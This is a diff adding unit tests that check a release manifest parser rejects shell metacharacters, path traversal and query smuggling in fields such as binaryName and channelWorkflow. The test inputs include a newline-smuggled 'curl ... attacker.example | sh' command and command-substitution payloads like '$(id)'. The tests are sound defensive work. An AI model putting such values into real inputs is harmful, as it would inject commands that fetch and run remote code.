@@ -82,6 +82,82 @@ describe("manifest contract defaults", () => {
   });
 });
 
+describe("release string character classes (R6-01, R6-07)", () => {
+  const parse = (releaseOver: Record<string, unknown>) =>
+    parseManifest({
+      product: JSON.stringify(PRODUCT),
+      schema: JSON.stringify(catalogWithSecretDelivery()),
+      release: JSON.stringify({
+        release: {
+          ghOwner: "acme",
+          ghRepo: "desktop",
+          binaryName: "acme",
+          ...releaseOver,
+        },
+      }),
+    });
+
+  it("rejects a binaryName carrying shell metacharacters", () => {
+    for (const binaryName of [
+      "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
+      'acme"; id > /tmp/pwned; :"',
+      "acme`id`",
+      "acme$(id)",
+      "acme'; id; '",
+      "-acme",
+      "a".repeat(65),
+    ]) {
+      const res = parse({ binaryName });
+      expect(res.ok).toBe(false);
+      if (res.ok) return;
+      expect(res.errors.join("\n")).toContain("release.binaryName must match");
+    }
+  });
+
+  it("accepts a conventional binaryName", () => {
+    for (const binaryName of ["acme", "acme-cli", "acme_cli", "Acme.2"]) {
+      expect(parse({ binaryName }).ok).toBe(true);
+    }
+  });
+
+  it("rejects dot-segment / query smuggling in channelWorkflow", () => {
+    for (const channelWorkflow of [
+      "../../../../../orgs/attacker-org/repos#",
+      "wf.yml/runs?actor=evil&",
+      "channel.txt",
+    ]) {
+      const res = parse({ channelWorkflow });
+      expect(res.ok).toBe(false);
+      if (res.ok) return;
+      expect(res.errors.join("\n")).toContain("release.channelWorkflow");
+    }
+    expect(parse({ channelWorkflow: "channel.yml" }).ok).toBe(true);
+    expect(parse({ channelWorkflow: "channel.yaml" }).ok).toBe(true);
+    expect(parse({ channelWorkflow: "12345678" }).ok).toBe(true);
+  });
+
+  it("bounds ghOwner / ghRepo / betaBranch / summaryMarker / sparkleEd25519Pub", () => {
+    expect(parse({ ghOwner: "acme/../victim" }).ok).toBe(false);
+    expect(parse({ ghRepo: "desktop?x=1" }).ok).toBe(false);
+    expect(parse({ betaBranch: "main&injected=1" }).ok).toBe(false);
+    expect(parse({ summaryMarker: "a".repeat(200) }).ok).toBe(false);
+    expect(parse({ sparkleEd25519Pub: "not a key!" }).ok).toBe(false);
+    expect(parse({ sparkleEd25519Pub: "PUBKEY==" }).ok).toBe(true);
+  });
+
+  it("drops requireSparkleSignature: a repo cannot disable the platform's own control", () => {
+    const res = parse({
+      artifactPolicy: { requireSparkleSignature: false, requireDmg: true },
+    });
+    expect(res.ok).toBe(true);
+    if (!res.ok) return;
+    expect(JSON.stringify(res.manifest.release?.artifactPolicy)).not.toContain(
+      "requireSparkleSignature",
+    );
+    expect(res.manifest.release?.artifactPolicy?.requireDmg).toBe(true);
+  });
+});
+
 describe("OIDC provider validation", () => {
   it("defaults missing oidc.provider to platform", () => {
     const res = parseManifest({
